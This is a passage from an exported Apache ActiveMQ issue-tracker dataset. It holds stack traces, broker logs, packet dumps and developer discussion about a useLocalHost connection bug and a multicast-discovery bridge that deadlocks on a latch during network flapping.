        at org.apache.activemq.console.command.ShellCommand.runTask(ShellCommand.java:136)
        at org.apache.activemq.console.command.AbstractCommand.execute(AbstractCommand.java:57)
        at org.apache.activemq.console.command.ShellCommand.main(ShellCommand.java:82)
        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
        at java.lang.reflect.Method.invoke(Method.java:597)
        at org.apache.activemq.console.Main.runTaskClass(Main.java:251)
        at org.apache.activemq.console.Main.main(Main.java:107)
Caused by: javax.jms.JMSException: Could not connect to broker URL: tcp://suse10sp268:61616. Reason: java.net.ConnectException: Connection refused
        at org.apache.activemq.util.JMSExceptionSupport.create(JMSExceptionSupport.java:35)
        at org.apache.activemq.ActiveMQConnectionFactory.createActiveMQConnection(ActiveMQConnectionFactory.java:286)
        at org.apache.activemq.ActiveMQConnectionFactory.createActiveMQConnection(ActiveMQConnectionFactory.java:230)
        at org.apache.activemq.ActiveMQConnectionFactory.createConnection(ActiveMQConnectionFactory.java:178)
        at org.apache.activemq.console.filter.AmqMessagesQueryFilter.createConnection(AmqMessagesQueryFilter.java:123)
        at org.apache.activemq.console.filter.AmqMessagesQueryFilter.queryMessages(AmqMessagesQueryFilter.java:87)
        at org.apache.activemq.console.filter.AmqMessagesQueryFilter.query(AmqMessagesQueryFilter.java:72)
        at org.apache.activemq.console.filter.WildcardTransformFilter.query(WildcardTransformFilter.java:60)
        at org.apache.activemq.console.util.AmqMessagesUtil.getMessages(AmqMessagesUtil.java:51)
        at org.apache.activemq.console.command.AmqBrowseCommand.runTask(AmqBrowseCommand.java:117)
        ... 10 more
Caused by: java.net.ConnectException: Connection refused
        at java.net.PlainSocketImpl.socketConnect(Native Method)
        at java.net.PlainSocketImpl.doConnect(PlainSocketImpl.java:333)
        at java.net.PlainSocketImpl.connectToAddress(PlainSocketImpl.java:195)
        at java.net.PlainSocketImpl.connect(PlainSocketImpl.java:182)
        at java.net.SocksSocketImpl.connect(SocksSocketImpl.java:366)
        at java.net.Socket.connect(Socket.java:519)
        at org.apache.activemq.transport.tcp.TcpTransport.connect(TcpTransport.java:436)
        at org.apache.activemq.transport.tcp.TcpTransport.doStart(TcpTransport.java:402)
        at org.apache.activemq.util.ServiceSupport.start(ServiceSupport.java:53)
        at org.apache.activemq.transport.TransportFilter.start(TransportFilter.java:57)
        at org.apache.activemq.transport.TransportFilter.start(TransportFilter.java:57)
        at org.apache.activemq.transport.WireFormatNegotiator.start(WireFormatNegotiator.java:72)
        at org.apache.activemq.transport.TransportFilter.start(TransportFilter.java:57)
        at org.apache.activemq.transport.TransportFilter.start(TransportFilter.java:57)
        at org.apache.activemq.ActiveMQConnectionFactory.createActiveMQConnection(ActiveMQConnectionFactory.java:266)
        ... 18 more


 but if i run 
activemq-admin.sh browse --amqurl tcp://suse10sp268.site:61616 TEST.FOO, no error, there is just one difference between two command: server host name, the former is short host name suse10sp268, the latter is full host name: sus10sp268.site
 tcp://suse10sp268:61616 
 tcp://suse10sp268.site:61616



;;;","21/Jun/10 08:58;viola.lu;if transportConnector is 0.0.0.0, amqurl start log is: 
INFO | Listening for connections at: tcp://suse10sp268:61616 
if i run : 
activemq-admin.sh browse --amqurl tcp://suse10sp268:61616 TEST.FOO, it will work. 

if transportConnector is suse10sp268, start log is 
INFO | Listening for connections at: tcp://suse10sp268.site:61616 
if i run 
activemq-admin.sh browse --amqurl tcp://suse10sp268:61616 TEST.FOO, it doesn't work, but ""activemq-admin.sh browse --amqurl tcp://suse10sp268.site:61616 TEST.FOO"" will work. ;;;","30/Jun/10 01:51;xuhaihong;I try to investigate the problem a bit. Before TCPTransport tries to connect the remote server, it would first call the resolveHost method to check whether the target remote host is the local machine, also it will check a boolean tag useLocalHost. From the comments in the codes, it said in Mac, there is a problem while trying to connect the local machine with its hostname. But, I am not sure whether it is a good choice in other platforms, usually the hostname is corresponding to the actual IP. Since the user configures the target server with hostname, it means that the actual IP is expected to connect to, because the server is only binding to actual IP, not the localhost (127.0.0.1) interface. 
I attached a patch, it just initialize the useLocalHost depending on the OS platform.;;;","27/Jul/10 09:39;eric-awl;In 5.3.2

With two distinct brokers on the same server with a single interface, and without localhost usage.

I experiment the same problem of connection refused on a multicast network connector connection. Only ""0.0.0.0"" seems to work as IP address of the transport connector

""name"" of the current host, with or without domain extension, with useLocalHost=true or useLocalHost=false doesn't work. 

It works in 5.3.0-5 fuse.

I don't know if using the virtual hostname associated to another interface in the /etc/hosts file, works. We must have this functionality in production environment to isolate flows for security reasons.

Eric-AWL;;;","28/Jul/10 07:59;eric-awl;With multicast discovery, I think I found the problem

My transport connector was in 5.3.0

      <transportConnector name=""TestDeCharge-DEFAULT-IN""
                          uri=""tcp://td0sib01s.priv.atos.fr:61616?useLocalHost=false""
                          discoveryUri=""multicast://default?group=TestDeCharge-DEFAULT""/>

In 5.3.0, the corresponding multicast frame is

09:59:02.870809 IP td0sib01s.priv.atos.fr.6155 > 239.255.2.3.6155: UDP, length 102
        0x0000:  4500 0082 0000 4000 0111 959b 0a18 e7b5  E.....@.........
        0x0010:  efff 0203 180b 180b 006e e44f 5465 7374  .........n.OTest
        0x0020:  4465 4368 6172 6765 2d44 4546 4155 4c54  DeCharge-DEFAULT
        0x0030:  2e41 6374 6976 654d 512d 342e 616c 6976  .ActiveMQ-4.aliv
        0x0040:  652e 256c 6f63 616c 686f 7374 2574 6370  e.%localhost%tcp
        0x0050:  3a2f 2f74 6430 7369 6230 3173 2e70 7269  ://td0sib01s.pri
        0x0060:  762e 6174 6f73 2e66 723a 3631 3631 363f  v.atos.fr:61616?
        0x0070:  7573 654c 6f63 616c 486f 7374 3d66 616c  useLocalHost=fal
        0x0080:  7365                                     se

In 5.3.2, the corresponding multicast frame is

[root@td0sib01s ~]# tcpdump -s 200 -c 4 src host td0sib01s and ip multicast -X
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), capture size 200 bytes
09:51:30.818735 IP td0sib01s.priv.atos.fr.6155 > 239.255.2.3.6155: UDP, length 83
        0x0000:  4500 006f 0000 4000 0111 95ae 0a18 e7b5  E..o..@.........
        0x0010:  efff 0203 180b 180b 005b e43c 5465 7374  .........[.<Test
        0x0020:  4465 4368 6172 6765 2d44 4546 4155 4c54  DeCharge-DEFAULT
        0x0030:  2e41 6374 6976 654d 512d 342e 616c 6976  .ActiveMQ-4.aliv
        0x0040:  652e 256c 6f63 616c 686f 7374 2574 6370  e.%localhost%tcp
        0x0050:  3a2f 2f74 6430 7369 6230 3173 2e70 7269  ://td0sib01s.pri
        0x0060:  762e 6174 6f73 2e66 723a 3631 3631 36    v.atos.fr:61616

without ""?useLocalHost=false""

A broker that is present on the same server wants to connect with useLocalHost=true => localhost and not ""address"".

it fails to connect.

Eric-AWL;;;","29/Jul/10 10:45;gtully;the parameters supplied to the TransportConnector are stripped of before being broadcast because many of the server side options are not applicable to the connection initiator (client side)
If you want a client to connect using useLocalHost=true, then that option needs to be specified on the brokerURL (connection factory) or on the networkConnector broker url. The parameters are then applied to all discovered urls.;;;","30/Jul/10 01:29;xuhaihong;Hi, Gary
    So for the initial purpose for this JIRA, do you mean that useLocal=false should be used ? I am just wondering that why ActiveQM assume to use localhost to connect the server if both client and server are the same machine, it is for performance ? But sometimes, the borker might not listen on 0.0.0.0, which means that client could not connect to the server via localhost.
     Thanks !;;;","09/Aug/10 09:40;gtully;yes, and that will be the default value in 5.4. see: https://issues.apache.org/activemq/browse/AMQ-2771
the useLocalHost flag is really a hack for macosx (at some stage) that should always have been disabled by default.

Also, the patch attached that makes the use of InetAddress.getLocalHost().getHostName() conditional on useLocalHost being set has been applied for 5.4 (r983565) which avoids one unnecessary resolution.;;;","09/Aug/10 09:41;gtully;variant of patch applied that makes localhost resolution conditional on useLocalHost which now defaults to false.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Network of brokers : Multicast discovery stopped to work,AMQ-2774,12482573,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,eric-awl,eric-awl,11/Jun/10 15:30,10/Feb/11 10:59,14/Jul/23 05:43,28/Jul/10 10:47,5.2.0,,,,,5.4.0,,,,,,,1,,,,,,,,,"Hi everybody

I experiment a big problem with the multicast discovery algorithm, in a network of brokers topology.
In some conditions, a broker can't reestablish a distant connection even if the distant broker is restarted.

I have the log traces that would help to identify the origin of the problem.

When there is no discovery/connection error, I can see these 2 lines in the activemq log file

#08 Jun 2010 14:31:30,639  INFO  [Multicast Discovery Agent Notifier] org.apache.activemq.network.DiscoveryNetworkConnector
Establishing network connection between from vm://ACCLU-tpnocp04v to tcp://tpnocp09v-bus:13100?useLocalHost=false

#08 Jun 2010 14:31:30,692  INFO  [StartLocalBridge: localBroker=vm://ACCLU-tpnocp04v#26] org.apache.activemq.network.DemandForwardingBridge
Network connection between vm://ACCLU-tpnocp04v#26 and tcp://tpnocp09v-bus/10.18.126.28:13100(MOM-tpnocp09v) has been established.


When the connection is broken, I can see this line in the log.

#11 Jun 2010 12:37:32,585  INFO  [Multicast Discovery Agent Notifier] org.apache.activemq.network.DemandForwardingBridge
ACCLU-tpnocp04v bridge to MOM-tpnocp09v stopped


Then the current ACCLU-tpnocp04v broker tries to reestablish the connection :

#11 Jun 2010 12:37:34,475  INFO  [Multicast Discovery Agent Notifier] org.apache.activemq.network.DiscoveryNetworkConnector
Establishing network connection between from vm://ACCLU-tpnocp04v to tcp://tpnocp09v-bus:13100?useLocalHost=false

But, here, the second line of the log (""has been established"") doesn't appear in the log file !! I don't know exactly if the connection is up or not.

Then the connection is broken again (look at ""Unknown"" instead of ""MOM-tpnocp09v"".

#11 Jun 2010 13:33:58,655  WARN  [ActiveMQ Transport: tcp://tpnocp09v-bus/10.18.126.28:13100] org.apache.activemq.network.DemandForwardingBridge
Network connection between vm://ACCLU-tpnocp04v#58 and tcp://tpnocp09v-bus/10.18.126.28:13100 shutdown due to a remote error: java.net.SocketException: Connection reset
#11 Jun 2010 13:33:58,657  INFO  [NetworkBridge] org.apache.activemq.network.DemandForwardingBridge^M
ACCLU-tpnocp04v bridge to Unknown stopped

And, now, even if I restart the distant broker ( MOM-tpnocp09v ), no line (Establishing/Has been established) appears, and no network connection is reestablished between ACCLU-tpnocp04v and MOM-tpnocp09v. it seems that this ACCLU-tpnocp04v broker can no longer establish a connection with the MOM-tpnocp09v broker !!!

The production teams tell me that this problem seems not to be resolved in fuse-5.3.0.6 version.

Eric-AWL

",Linux,ciand7,s1ngle,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-3129,,,,,,,,,AMQ-3176,,,,,,,,,"22/Jul/10 13:36;eric-awl;AMQ2774.tar;https://issues.apache.org/jira/secure/attachment/12460748/AMQ2774.tar","17/Jun/10 07:18;eric-awl;JMAC-BEA-lastlog.log-20100315;https://issues.apache.org/jira/secure/attachment/12461743/JMAC-BEA-lastlog.log-20100315","27/Jul/10 14:48;eric-awl;SocketTstFactory.java;https://issues.apache.org/jira/secure/attachment/12461787/SocketTstFactory.java","28/Jul/10 08:42;eric-awl;activemq-all-5.3.2-eric.jar;https://issues.apache.org/jira/secure/attachment/12461790/activemq-all-5.3.2-eric.jar","27/Jul/10 15:25;s1ngle;activemq-bug-2774-tcpToSsl.log;https://issues.apache.org/jira/secure/attachment/12461788/activemq-bug-2774-tcpToSsl.log",,,,,,,,,,,,,,,,,5.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14631,,,Wed Jul 28 11:32:17 UTC 2010,,,,,,,,,,,"0|i0b9ov:",63682,,,,,,,,,,,,,,,,,,,,,"11/Jun/10 15:54;gtully;There is a bunch more trace level logging in 5.3, if you can reproduce with TRACE level logging with 5.3.x and attach the log that may help. Ideally of course, if you can reproduce with a test case that would be great!;;;","12/Jun/10 05:57;eric-awl;Hi Gary

I understand that more traces are needed. Unfortunately, this happens sometimes on our production system (30 servers on 2 sites). And you can see there is 3 days between the launch of the MOM-tpnocp09v and its first stop. 
Putting ""Trace"" level traces in these conditions will be very difficult. Because the volume of traces will be very heavy. 

But I will contact the production managers to see what can be done.

I suspect the ConcurrentHashMap<String,RemoteBrokerData> in the class MulticastDiscoveryAgent, is not correctly updated when the bridge is stopped in an ""Unknown"" state.

 Eric-AWL;;;","13/Jun/10 07:30;eric-awl;Hi

I looked at MulticastDiscoveryAgent.java source. The ""doRecovery"" method is the only one that tells the connection must be reestablished. The indicator ""failed"" is put to false as soon as the recovery conditions are filled and even if the connection is not really reestablished (that seems to be my case) . As soon as ""failed"" indicator is false, the recovery and the reconnection (fireServiceAddEvent) can't be retried. Only ""serviceFailed"" method can put ""failed"" to true again.

Just by looking to this java source, it seems that a situation where the connection is not re-established, the indicator ""failed"" is false, the multicast heartbeat frames are received, is possible .... Only the call to ""serviceFailed"" can put the failed indicator to true (or delete the object entry in the hashmap). Is it possible that serviceFailed is not called although the connection is down ?

(I think that it should be safer that ""failed"" be an atomic boolean since I believe serviceFailed method could be called by another thread)

Eric-AWL;;;","15/Jun/10 07:38;eric-awl;It seems that the ""... has been established"" trace can only be written if the remoteBrokerNameKnownLatch.await() condition is filled.

contdown is called into DemandForwardingBridge.serviceRemoteBrokerInfo
serviceRemoteBrokerInfo is called into DemandForwardingBridgeSupport.serviceRemoteCommand (only if disposed.get() is false).;;;","17/Jun/10 07:18;eric-awl;A part of a stack trace which shows that ""Multicast Discovery Agent Notifier"" thread is blocked on the remoteBrokerNameKnownLatch.;;;","17/Jun/10 07:33;eric-awl;We are in a full embedded broker configuration.

I attach a part of an old stack trace (I delete all our own threads and the queueThreads). I think this trace was done (in march) just when one of our embedded broker doesn't succeed to reconnect to another one.

This trace is not exactly the same as the explanation since processes are not exactly the one. But this stack trace shows that ""Multicast Discovery Agent Notifier"" is blocked on the remoteBrokerNameKnownLatch.await() into the ""bridge.start()"" call (DiscoveryNetworkConnector.onServiceAdd)

            localBroker.start();
            remoteBroker.start();
            if (configuration.isDuplex() && duplexInitiatingConnection == null) {
                // initiator side of duplex network
                remoteBrokerNameKnownLatch.await();
            }

Corresponding ""serviceFailed"" call, can not be called (no exception) until this latch is released, which can only be done if serviceRemoteBrokerInfo call is done, what can be impossible if distant embedded broker is failed.

            try {
                bridge.start();
            } catch (Exception e) {
                ServiceSupport.dispose(localTransport);
                ServiceSupport.dispose(remoteTransport);
                LOG.warn(""Could not start network bridge between: "" + localURIName + "" and: "" + uri + "" due to: "" + e);
                LOG.debug(""Start failure exception: "" + e, e);
                try {
                    discoveryAgent.serviceFailed(event);
                } catch (IOException e1) {
                    LOG.debug(""Discovery agent failure while handling failure event: "" + e1.getMessage(), e1);
                }
                return;
            }

While ""serviceFailed"" is not called and multicast frames are received, it seems impossible to try to reconnect to this distant broker even if it is shortly restarted ?

;;;","06/Jul/10 09:33;eric-awl;I'm sure that I identified a Latch problem in Multicast Network Discovery mechanism on Duplex connection 

The multicast notifier thread is blocked. here the trace (on Fuse-5.3.0.5)

""Notifier-MulticastDiscoveryAgent-listener:DiscoveryNetworkConnector:NOCSupervisorP5-ADMIN-OUT-IN:BrokerService[SIBBusModule-NOCP5-tpnocp08s-bus]"" daemon prio=10 tid=0x0000000044ff2400 nid=0x1389 waiting on condition [0x0000000044c26000..0x0000000044c26b90] 
   java.lang.Thread.State: WAITING (parking) 
        at sun.misc.Unsafe.park(Native Method) 
        - parking to wait for  <0x00002aaab3dd66f0> (a java.util.concurrent.CountDownLatch$Sync) 
        at java.util.concurrent.locks.LockSupport.park(LockSupport.java:158) 
        at java.util.concurrent.locks.AbstractQueuedSynchronizer.parkAndCheckInterrupt(AbstractQueuedSynchronizer.java:747) 
        at java.util.concurrent.locks.AbstractQueuedSynchronizer.doAcquireSharedInterruptibly(AbstractQueuedSynchronizer.java:905) 
        at java.util.concurrent.locks.AbstractQueuedSynchronizer.acquireSharedInterruptibly(AbstractQueuedSynchronizer.java:1217) 
        at java.util.concurrent.CountDownLatch.await(CountDownLatch.java:207) 
        at org.apache.activemq.network.DemandForwardingBridgeSupport.start(DemandForwardingBridgeSupport.java:231) 
        at org.apache.activemq.network.DiscoveryNetworkConnector.onServiceAdd(DiscoveryNetworkConnector.java:114) 
        at org.apache.activemq.transport.discovery.multicast.MulticastDiscoveryAgent$2.run(MulticastDiscoveryAgent.java:484) 
        at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886) 
        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908) 
        at java.lang.Thread.run(Thread.java:619) 

The problem appears when the network is quickly and alternatively on/off between the two components. 
The bridge is created in one direction, but the answer can not be received. 

The thread is blocked on the CountDownLatch. Even if multicast frames are received, the component can not establish a new network connection. 

Here are an corresponding activemq trace 

When it is OK : 
2010-06-22 22:56:24,500 [-tpnocp08s-bus]] INFO  DiscoveryNetworkConnector      - Establishing network connection from vm://SIBBusModule-NOCP5-tpnocp08s-bus to tcp://tpnocp11v-bus.vdm.priv.amm.noc:14101?useLocalHost=false 
2010-06-22 22:56:26,083 [nocp08s-bus#160] INFO  DemandForwardingBridge         - Network connection between vm://SIBBusModule-NOCP5-tpnocp08s-bus#160 and tcp://tpnocp11v-bus.vdm.priv.amm.noc/10.18.126.30:14101(SIBBusSupervisor-tpnocp11v-bus) has been established. 

2010-06-22 22:57:34,807 [-tpnocp08s-bus]] INFO  DemandForwardingBridge         - SIBBusModule-NOCP5-tpnocp08s-bus bridge to SIBBusSupervisor-tpnocp11v-bus stopped 

2010-06-22 22:57:34,811 [-tpnocp08s-bus]] INFO  DiscoveryNetworkConnector      - Establishing network connection from vm://SIBBusModule-NOCP5-tpnocp08s-bus to tcp://tpnocp11v-bus.vdm.priv.amm.noc:14101?useLocalHost=false 
2010-06-22 22:57:39,064 [nocp08s-bus#162] INFO  DemandForwardingBridge         - Network connection between vm://SIBBusModule-NOCP5-tpnocp08s-bus#162 and tcp://tpnocp11v-bus.vdm.priv.amm.noc/10.18.126.30:14101(SIBBusSupervisor-tpnocp11v-bus) has been established. 

2010-06-22 22:58:42,578 [-tpnocp08s-bus]] INFO  DemandForwardingBridge         - SIBBusModule-NOCP5-tpnocp08s-bus bridge to SIBBusSupervisor-tpnocp11v-bus stopped 

When it is KO : ""Unknown"" 

2010-06-22 22:58:42,648 [-tpnocp08s-bus]] INFO  DiscoveryNetworkConnector      - Establishing network connection from vm://SIBBusModule-NOCP5-tpnocp08s-bus to tcp://tpnocp11v-bus.vdm.priv.amm.noc:14101?useLocalHost=false 
2010-06-22 22:59:18,031 [18.126.30:14101] WARN  DemandForwardingBridge         - Network connection between vm://SIBBusModule-NOCP5-tpnocp08s-bus#164 and tcp://tpnocp11v-bus.vdm.priv.amm.noc/10.18.126.30:14101 shutdown due to a remote error: java.net.SocketException: Connection reset 
2010-06-22 22:59:18,033 [NetworkBridge  ] INFO  DemandForwardingBridge         - SIBBusModule-NOCP5-tpnocp08s-bus bridge to Unknown stopped 


Here is the other side corresponding activemq trace 

activemq-server.log:2010-06-22 22:55:44,295 [26.190.27:40517] INFO  TransportConnection            - Created Duplex Bridge back to SIBBusModule-NOCP5-tpnocp08s-bus 

activemq-server.log:2010-06-22 22:56:24,438 [26.190.27:40517] INFO  DemandForwardingBridge         - SIBBusSupervisor-tpnocp11v-bus bridge to SIBBusModule-NOCP5-tpnocp08s-bus stopped 

activemq-server.log:2010-06-22 22:56:26,135 [26.190.27:40518] INFO  TransportConnection            - Created Duplex Bridge back to SIBBusModule-NOCP5-tpnocp08s-bus 
activemq-server.log:2010-06-22 22:56:26,135 [ocp11v-bus#1770] INFO  DemandForwardingBridge         - Network connection between vm://SIBBusSupervisor-tpnocp11v-bus#1770 and tcp:///10.26.190.27:40518(SIBBusModule-NOCP5-tpnocp08s-bus) has been established. 

activemq-server.log:2010-06-22 22:57:34,818 [26.190.27:40518] INFO  DemandForwardingBridge         - SIBBusSupervisor-tpnocp11v-bus bridge to SIBBusModule-NOCP5-tpnocp08s-bus stopped 

activemq-server.log:2010-06-22 22:57:39,153 [26.190.27:40519] INFO  TransportConnection            - Created Duplex Bridge back to SIBBusModule-NOCP5-tpnocp08s-bus 
activemq-server.log:2010-06-22 22:57:39,153 [ocp11v-bus#1806] INFO  DemandForwardingBridge         - Network connection between vm://SIBBusSupervisor-tpnocp11v-bus#1806 and tcp:///10.26.190.27:40519(SIBBusModule-NOCP5-tpnocp08s-bus) has been established. 

activemq-server.log:2010-06-22 22:58:44,328 [26.190.27:40519] INFO  DemandForwardingBridge         - SIBBusSupervisor-tpnocp11v-bus bridge to SIBBusModule-NOCP5-tpnocp08s-bus stopped 
;;;","06/Jul/10 11:10;eric-awl;What could happen if we add

         if (configuration.isDuplex() && duplexInitiatingConnection == null) {
                // initiator side of duplex network
                remoteBrokerNameKnownLatch.countDown();
            }

into the stop() method of DemandForwardingBridgeSupport class ?

;;;","07/Jul/10 16:04;eric-awl;We put a no-Duplex Configuration instead of a Duplex Configuration and it seemed to work better.... But
today during a network problem (alternatively on/off) our process doesn't resist ....

We have 
- a thread dump which shows 85 StartLocalBridge Threads waiting for the same latch into the DemandForwardingBridgeSupport.StartLocalBridge method :

 protected void startLocalBridge() throws Exception {
        if (localBridgeStarted.compareAndSet(false, true)) {
            synchronized (this) {
                if (LOG.isTraceEnabled()) {
                    LOG.trace(configuration.getBrokerName() + "" starting local Bridge, localBroker="" + localBroker);
                }
                remoteBrokerNameKnownLatch.await();
                ...
}

- 960 CLOSE_WAIT
- a file descriptor limit

Will the transport.closeAsync=false flag be helpful here ?

Eric-AWL;;;","11/Jul/10 08:25;eric-awl;If I resume my view of the problem

When the problem occurs
- Network links between 2 brokers, are quickly and alternatively on/off. In french, we say that the network is ""bagotting"" :-)
- The DemandForwardingBridgeSupport.stop() method is called before the start() method  (including sons threads start methods) is fully exectuted

Consequences
- With NO DUPLEX connection, network of brokers are re-established, but some threads are created and blocked on the RemoteBrokerNameKnownLatch latch. 
In this case, the latch is awaited in the startLocalBridge() method which is called by a dedicated thread. So, a major problem occured when ressources are consumed if this kind of network faults are frequent, and the number of network connections is important. 
- With DUPLEX connection,  the latch is awaited in the start() method itself.  The main network connector thread is concerned. So the network connector is completely blocked.

I currently try to
- add a RemoteBrokerNameLatch.countDown at the end of the stop() method
- test the disposed AtomicBoolean value to correctly break the starting process in start() for DUPLEX, and in startLocalBridge() for NO-DUPLEX.

I think it will be better for DUPLEX since network connector thread will be freed, but I don't know if the son thread will be correctly destroyed.

Eric-AWL ;;;","21/Jul/10 09:33;eric-awl;Hi

I think I now have programmed a clean correction for this specific latch problem. And I can give you the sources. With these sources, the network connector is not ever blocked even if a network fault comes during the start'() process.

But, before giving you these sources, I have relative questions, with duplex TCP connections :

Imagine a brief network fault

On the network connector side of the DUPLEX connection, the fault is detected, the TCP bridge is closed. Socket.close() is executed, but the socket is in a CLOSE_WAIT state.
The ""transport connector side"" of the DUPLEX connection is not aware that the first connection is down while its InactivityMonitor Thread doesn't signal it.

Then, on the network connector side, the bridge wants to be built again, and the network is now ON. The ""transport connector side"" creates a second active bridge for the same DUPLEX connection.
So, the ""transport connector"" side temporarily sees 2 distant broker for the same one, while the InactivityMonitor thread doesn't signal the death of the first TCP connection.

Is this true ?

Eric-AWL
;;;","21/Jul/10 11:20;gtully;Great if you have a fix.

to your question, that sounds true to me, but I would have thought that the second bridge creation attempt is considered distinct because it occurs on a new connection.;;;","22/Jul/10 13:36;eric-awl;I propose you this patch in the tar file (for ActiveMQ 5.3.2 version)

2 modifications are brought :
- the RemoteBrokerNameKnownLatch is countdown at the end of the stop() to free the connector thread even if it doesn't receive the correct remote broker info. That can appear when network is successively and quickly on/off. In the case of a DUPLEX connection, the network connector was then totally blocked. In the case of a not duplex connection, some dead threads were up.
- the second modification tries to stop an old invalid duplex Transport Connection when a new Duplex Transport Connection is required by the same broker for the same transport Connector

I tried to realize a JUNIT test which simulates a lot of ""close socket"" even during bridge start process. It seems to work, but I didn't succeed in simulating the second modification. 
the JUNIT test include a ""tcpfaulty"" transport with two socket factories. In the future I will try to put SocketProxy code into the ServerSocketTstFactory.

This situation where a second duplex connection tried to be established before the first one was clearly dead, appeared in my own (not JUNIT) tests , when a brief networkl fault occured and when only the first modification was implemented.

All modifications are clearly indicated by 
// Eric-AWL AMW-2774 Beginning
// Eric-AWL AMW-2774 End

Sorry for the poor english. (I'm french)

Eric-AWL
;;;","26/Jul/10 12:31;gtully;I applied just the test component of your patch to trunk, 5.4-SNAPSHOT and ran the test and it worked just fine without any mods to the src in main/java. Is this expected? Or do you only get intermittent failures with the test. I wonder if the issue is resolved already on trunk? Can you validate trunk?;;;","26/Jul/10 12:52;eric-awl;Hi Gary

It's very difficult to simulate quick network faults. With my JUNIT test, I simulate close() immediately or some seconds later (with a random value). When the close() is done immediatly, I succeeded  in  validating DUPLEX network of brokers and that nothing was blocked in this situation with my patch :

2010-07-26 14:09:20,001 [ce[SpokeBroker]] INFO  DiscoveryNetworkConnector      - Establishing network connection from vm://SpokeBroker to tcpfaulty://localhost.localdomain:61617
2010-07-26 14:09:20,035 [ocalport=32972]] INFO  SocketTstFactory               - Trying to close client socket Socket[addr=localhost.localdomain/127.0.0.1,port=61617,localport=32972] immediatly
2010-07-26 14:09:20,036 [ocalport=32972]] INFO  SocketTstFactory               - Client socket Socket[addr=localhost.localdomain/127.0.0.1,port=61617,localport=32972] is closed.
2010-07-26 14:09:20,037 [127.0.0.1:61617] WARN  DemandForwardingBridge         - Network connection between vm://SpokeBroker#8 and tcpfaulty://localhost.localdomain/127.0.0.1:61617 shutdown due to a remote error: java.net.SocketException: Socket closed
2010-07-26 14:09:20,038 [NetworkBridge  ] INFO  DemandForwardingBridge         - SpokeBroker bridge to Unknown stopped

In this kind of situation (bridge to Unknown stopped), I experimented on 5.3.0-05 fuse production environment, that the network of connector thread was completely blocked on the latch, with Duplex connections.

I'm not sure that my JUNIT test demonstrates the problem on 5.3.0-05. It helped me to debug my own patch.

I don't try my JUNIT test on 5.3.0-5 fuse version. I'm going to verify that my JUNIT test sometimes shows the problem with the 5.3.0-5 core jar.

I can look at 5.4-snapshot source code to see if something is already changed about this latch on the trunk.

I will tell you my results.

Eric-AWL
;;;","26/Jul/10 13:05;gtully;yea, I understand this is difficult to test but the effort is worth it to protect the changes. One thought that may help is the use of SockeProxy to simulate a network failure or slow network. There is an example usage in http://svn.apache.org/viewvc/activemq/trunk/activemq-core/src/test/java/org/apache/activemq/usecases/BrokerQueueNetworkWithDisconnectTest.java?view=log - see the org.apache.activemq.usecases.BrokerQueueNetworkWithDisconnectTest#onSend use of socketProxy. This gave me a test case for a similar issue some time back so it may be worth a look, it is not unlike what you do in TcpFaulty but is very deterministic which may help.;;;","26/Jul/10 13:42;eric-awl;Yes, I saw this JUNIT test, and I will try to adapt SocketProxy into the TCPFaultyServerSocketFactory, to simulate pause in the accept().

I can't imagine that this JUnit test doesn't work with 5.3.0-05-fuse, but we expiremented this latch situation with network faults regularly (stack traces was taken some hours after the frozen state was discovered of the network connector, and these traces always show the ""await"" on this latch with duplex connection).

Eric-AWL
;;;","27/Jul/10 09:15;eric-awl;At first view, on the 5.4-SNAPSHOT, with the last modification, the remoteBrokerNameKnownLatch is not countdown in the stop() method of the DemandForwardingBridge. I don't think that the network connector freeze in DUPLEX connection, is resolved.

Eric-AWL;;;","27/Jul/10 14:48;eric-awl;Hi Gary

You will find here a new version of the my own org.apache.activemq.transport.tcp.SocketTstFactory.java far more deterministic (no random)

In fact, in this one, the duplex network connection is forcely closed in my ""bagot thread"", after 0 ms, then 1 ms, then 2 ms, then ...., then 11 ms, then 31 ms, then 51 ms, then 71 ms, .....

With my patch on the 5.3.2, and my test server, the JUNIT test succeeds (I think always), With the 5.3.2 version, the JUNIT test doesn't succeed (I think never).

On my test server (a good one with 2 CPUs), it's when the connection is closed between 1 and 3 ms, after the connect() call that the network connector is frozen. If the close connection is done immediately, or after 3 ms, the network connector continues to live.

I can't test on 5.4-trunk since I don't have a SVN with HTTPS support on my test server.

I hope this will help you to test on 5.4 and to validate my patch.

Eric-AWL;;;","27/Jul/10 14:57;eric-awl;I didn't receive any mail to signal that I just added a new attachment with a comment on this thread. This comment is just to signal this if necessary !!!

Sorry if you receive 2 mails. 
Eric-AWL;;;","27/Jul/10 15:25;s1ngle;Logs that appears during the start operation on a DiscoveryNetworkConnector with TCP URI to the broker with SSL URI.
;;;jira-users","27/Jul/10 15:26;s1ngle;I've encountered similar problem though in a different case.
Imho it is far more easily reproducible.
The case is when you try to add a DiscoveryNetworkConnector between the brokers with a TCP connection set to the broker that has SSL enabled [not TCP].

The operation is blocking [on a DemandForwardingBridgeSupport.start() -> remoteBrokerNameKnownLatch.await(); operation] and new threads are being created, all blocked on the same operation :
DiscoveryNetworkConnector.onServiceAdd()
DemandForwardingBridgeSupport.start()
CountDownLatch.await().

Here are the logs that appears during the situation described above:
